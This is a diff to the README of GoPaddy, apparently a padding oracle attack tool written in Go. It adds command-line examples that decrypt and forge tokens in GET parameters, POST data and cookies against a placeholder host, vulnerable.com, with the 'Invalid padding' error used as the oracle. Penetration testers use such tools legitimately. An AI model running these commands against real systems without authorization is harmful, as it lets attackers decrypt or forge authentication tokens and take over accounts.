@@ -11,9 +11,14 @@ go get github.com/glebarez/GoPaddy
 ```
 
 ### Examples
-- Decipher tokens in GET parameters
+- Decrypt tokens in GET parameters
 ```console
 GoPaddy -u "http://vulnerable.com/login?token=$" -err "Invalid padding" "u7bvLewln6PJ670Gnj3hnE40L0SqG8e6"
+````
+
+- Decrypt tokens in GET parameters (lowercase hex)
+```console
+GoPaddy -u "http://vulnerable.com/login?token=$" -err "Invalid padding" -e lhex "2a7bc39262b122e58b13a95de49677b056c41a577f9d6904b921c0b0763c2cf3"
 ````
 
 - POST data
@@ -25,6 +30,17 @@ GoPaddy -u "http://vulnerable.com/login" -post "token=$" -err "Invalid padding" 
 ```console
 GoPaddy -u "http://vulnerable.com/login" -cookie "auth=$" -err "Invalid padding" "u7bvLewln6PJ670Gnj3hnE40L0SqG8e6"
 ````
+
+- Encrypt token in GET parameter
+```console
+GoPaddy -u "http://vulnerable.com/login?token=$" -err "Invalid padding" -enc "EncryptMe"
+```
+
+- Encrypt token in GET parameter (lowercase hex)
+```console
+GoPaddy -u "http://vulnerable.com/login?token=$" -err "Invalid padding" -enc -e lhex "EncryptMe"
+```
+
 ### Note on tool chaining
 All the fancy stuff (logo and progress tracking) is written to STDERR. <br>
 Thus you may safely redirect STDOUT to a file, or pipe it with another tool. <br>
